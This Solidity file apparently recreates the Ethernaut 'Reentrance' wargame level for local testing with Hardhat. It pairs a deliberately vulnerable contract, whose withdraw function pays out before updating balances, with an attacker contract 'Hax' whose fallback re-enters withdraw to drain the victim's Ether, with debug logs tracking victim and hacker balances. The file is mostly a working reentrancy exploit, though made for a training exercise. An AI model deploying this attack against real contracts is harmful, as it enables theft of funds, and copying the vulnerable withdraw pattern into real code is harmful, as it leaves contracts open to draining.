// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

//import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import 'hardhat/console.sol';

contract Hax {
    Reentrance re;
    address payable immutable reentranceAddress;
    uint256 amount = 1000000000000000;

    constructor(address payable _reentranceAddress) public payable {
        reentranceAddress = _reentranceAddress;
        re = Reentrance(_reentranceAddress);
    }

    function donate() public payable {
        re.donate{value: msg.value}(payable(address(this)));
      // re.donate{value: msg.value}(payable(msg.sender));

    }

    function withdraw() public payable {
        re.withdraw(amount);
    }

    function hack() external payable {
      require(msg.value == amount);
        re.donate{value: msg.value}(payable(address(this)));

      // re.donate{value: msg.value}(payable(msg.sender));
      re.withdraw(amount);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external payable {
      console.log("Re-entrancy Contract balance: %s", address(re).balance);
      //console.log("Amount: %s", amount);
      
      if(address(re).balance >= amount) {
        console.log("Withdrawing...");
        try re.withdraw(amount) {

        } catch Error(string memory reason) {
          console.log(reason);
        }
      }
    }
}

contract Reentrance {
  
  //using SafeMath for uint256;
  mapping(address => uint) public balances;

  constructor() public payable {

  }

  function donate(address _to) public payable {
      console.log("Donating...");
      console.log("To address: %s", _to);
      console.log("Message sender: %s", msg.sender);
      console.log(msg.value);
      balances[_to] += msg.value;
      //balances[_to] = balances[_to].add(msg.value);
      console.log("Finished donating...");

  }

  function balanceOf(address _who) public view returns (uint balance) {
      console.log(_who);
      console.log(balances[_who]);
    return balances[_who];
  }

  function withdraw(uint _amount) public {
      console.log("Inside Re-entrancy withdraw");
      console.log(_amount);
      console.log("Sender address: %s", msg.sender);
      console.log("Sender balance: %s", balances[msg.sender]);
    if(balances[msg.sender] >= _amount) {
        console.log("Entered if");
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        console.log("Call passed");
        _amount;
      }
        console.log("Subtracting amount from address %s", msg.sender);
        console.log("Victim balance: %s", address(this).balance);
        console.log("Hacker balance: %s", address(msg.sender).balance);

      balances[msg.sender] -= _amount;
    }
    console.log("Finished withdraw.");
    console.log("Victim balance: %s", address(this).balance);
    console.log("Hacker balance: %s", address(msg.sender).balance);
  }

  function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

  receive() external payable {}
}